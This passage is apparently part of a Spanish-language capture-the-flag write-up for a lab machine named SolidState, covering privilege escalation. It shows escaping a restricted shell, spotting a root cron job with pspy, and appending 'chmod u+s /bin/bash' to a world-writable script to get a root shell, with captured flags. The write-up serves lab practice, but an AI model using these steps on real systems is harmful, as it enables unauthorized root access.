+</div><h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Nos conectamos mediante <code>SSH</code> con el usuario Mindy y la contraseña que obtuvimos anteriormente. Una vez dentro nos vamos a dar cuenta de que hay comando que no vamos a poder ejecutar, esto se trata porque nos encontramos bajo una <strong>restricted bash</strong> . Aun así somo capaces de visualizar la flag de <strong>user.txt</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh mindy@10.10.10.51
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.10.51 (10.10.10.51)&#39;</span> can<span class="sb">`</span>t be established.
+</span></span><span class="line"><span class="cl">ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
+</span></span><span class="line"><span class="cl">Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no/<span class="o">[</span>fingerprint<span class="o">])</span>? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added <span class="s1">&#39;10.10.10.51&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">mindy@10.10.10.51<span class="sb">`</span>s password: 
+</span></span><span class="line"><span class="cl">Linux solidstate 4.9.0-3-686-pae <span class="c1">#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Aug <span class="m">22</span> 14:00:02 <span class="m">2017</span> from 192.168.11.142
+</span></span><span class="line"><span class="cl">mindy@solidstate:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">5a1fbcfb4abde72621e0f2a7bc42a7d0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Para poder escapar de esta restricted vas hay varias maneras, yo lo hice a traves del servidor apache que hay en el puerto 4555
+Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2) → <a class="link" href="https://www.exploit-db.com/exploits/50347"  target="_blank" rel="noopener"
+    >https://www.exploit-db.com/exploits/50347</a>
+Simplemente es usar el exploit y segir lo pasos que hay en el mismo.</p>
+<p>Otra forma de escapar de la restricted bash seria simplemente con <strong>SSH</strong> la cual seria de la siguiente manera <code>ssh mindy@&lt;IP&gt; bash</code></p>
+<p>Una vez dentro nos descargamos en nuetra máquina de atacante la herramienta <strong>pspy</strong> y despues la pasamos a la máquina víctima.Le damos permisos de ejecución a la herramienta y la lanzamos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pspy32
+</span></span><span class="line"><span class="cl">2023/03/16 13:06:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">3698</span>   <span class="p">|</span> /bin/sh -c python /opt/tmp.py 
+</span></span><span class="line"><span class="cl">2023/03/16 13:06:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">3699</span>   <span class="p">|</span> python /opt/tmp.py 
+</span></span><span class="line"><span class="cl">2023/03/16 13:06:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">3700</span>   <span class="p">|</span> 
+</span></span><span class="line"><span class="cl">2023/03/16 13:06:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">3701</span>   <span class="p">|</span> sh -c rm -r /tmp/*  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vemos que se esta ejecutando cada cierto tiempo un script en python el cual es <strong>tmp.py</strong>, además que lo está ejecutando el usuario root.
+Podemos ver su contenido y vemos qe no hace nada del otro mundo, borra de forma recursiva todo lo qe haya en la carpeta <strong>/tmp</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">8</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">11</span> root root <span class="m">4096</span> Apr <span class="m">26</span>  <span class="m">2021</span> james-2.3.2
+</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> root root  <span class="m">137</span> Mar <span class="m">16</span> 13:08 tmp.py
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ cat tmp.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -r /tmp/* &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Simplmente podemos añadir una línea en la cual le asignemos permisos <strong>SUID</strong> a la bash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -r /tmp/* &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;chmod u+s /bin/bash&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez modificado el script, solo toca esperar a que apareza una &rsquo;s&rsquo; en el primer triplete de los permisos de los archivos. Una vez haya aparecido esta &rsquo;s&rsquo; podremos ejecutar el siguiente comando para obtener una bash de forma privilegiada: <code>bash -p</code>.</p>
+<p>Una vez ejecutado podremos viusalizar la flag de root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ ls -l /bin/bash 
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1265272</span> May <span class="m">15</span>  <span class="m">2017</span> /bin/bash
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ bash -p
+</span></span><span class="line"><span class="cl">bash-4.4# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bash-4.4# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">4d934c7b9c3bfd2914d3bd8b1c013f31
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/writeup-inject/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WriteUp Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Liv3P0ol
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.20.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
